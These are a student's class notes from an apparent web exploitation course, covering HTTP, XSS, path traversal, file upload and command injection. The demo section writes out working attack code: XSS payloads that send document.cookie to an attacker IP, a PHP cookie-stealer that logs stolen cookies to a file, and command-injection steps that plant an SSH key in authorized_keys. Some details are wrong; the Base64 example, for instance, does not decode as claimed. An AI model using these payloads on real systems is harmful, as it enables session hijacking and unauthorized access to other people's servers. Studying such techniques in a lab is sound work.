Day 1
 - Server/Client Realtionship
    - Synchronous communications between user and services
    - Not all data is not returned, client only receives what is allowed
 - HTTP
    - Request/Response
       - Various tools to view
          - tcpdump
          - wireshark
          - Developer Console
    - Methods
       - Get
       - Post
       - Head
       - Put
    - Response Codes
       - 10x = Informational
       - 2xx = Success
       - 30x = Redirection
       - 4xx = Client Error
       - 5xx = Server Error
    - Packet headers
    - Fields
       - User-Agent
       - Referer
       - Cookie
       - Date
       - Server
       - Set-Cookie
    - Method notes
       - Get pulls from
       - Post posts to the server
       - wget
       - curl
       - JavaScript(JS)
          - Allows website to interact with the client
             - JavaScript runs on the clients machine
          - Coded as .JS files, or in-line of HTML
       - Dev Console
          - Enumeration
             - ROBOTS.TXT
             - Legitimate surfing
             - Tools:
                - NSE scripts
                - Nikto
                - Burp suite (outside class)
 - Cross-Site Scripting (XSS) Overview
    - Insertion of arbitrary code into a webpage, that executes in the browser of visistors
    - Unsanitized GET,POST,and PUT methods allow JS to be placed on websites
    - Often found in forums that allow HTML
    - Reflected XSS
       - Most common form of XSS
       - Transient, occurs in error messages or search results
       - Delivered through intermediate media, such as a link in an email
       - Characters that are normally illegal in URLs can be Base64 encoded
       - Example
          - http://example.com/page.php?name=dXNlcjEyMw
             - the server will decode as name=abc123
    - Stored XSS
       - Resides on vulnerable site
       - Only requires user to visit page
          - Useful JavaScript Components
             - Capturing Cookies
             - Capturing Keystrokes
                - bind KEYDOWN and KEYUP
             - Capturing sensitive data
    - Server-Side injection
       - Ability to read/execute outside web servers directory
       - Uses ../../(Relative paths) in manipulating server-side file path
    - Malicious File Upload
       - Server doesn't validate extension or size
       - Allows for code execution
       - Once uploaded
          - Find your file
          - Call your file
   - Command Injection
      - Application on ther server is vulnerable, allowing execution of arbitrary commands
         - User input not validated
            - Common example is a SOHO router, with a web page to allow ping
  - Demo
     - nmap --script=http-enum.nse
     - nikto -host 10.50.xx.xx
     - steal cookies
  1 <script>document.location="10.50.28.138:8000"+document.cookie;</script>
  2 
  3 python3 -m http.server      
       - Another cookie stealer:
  1 <?php
  2 $cookie = $_GET["username"];
  3 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
  4 fwrite($steal, $cookie ."\n");
  5 fclose($steal);
  6 ?>

       - To run the uploaded cookie stealer
          - <script>document.location="http://theSERVERIP/uploads/cookiestealer.php?username="+document.cookie;</script> 
       
       
       
       - How to send ssh public key using command injection
          - find the users home directory (user you have control over)
          - generate your rsa key (ssh-keygen -t rsa -b 4096)
          - cat .ssh/id_rsa.pub
          - copy all contents except the username@box
          - return to command injecton location
          - execute (;mkdir .ssh) make sure to specify absolute path
          - execute (;ls -la) to verify the directory was created
          - execute (;echo "copied rsa" > /var/www/.ssh/authorized_keys)
          - execute (;cat /var/www/.ssh/authorized_keys) to verify your key was added
          - when sshing to the box after this execute (ssh -i .ssh/id_rsa username@tgtip)
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
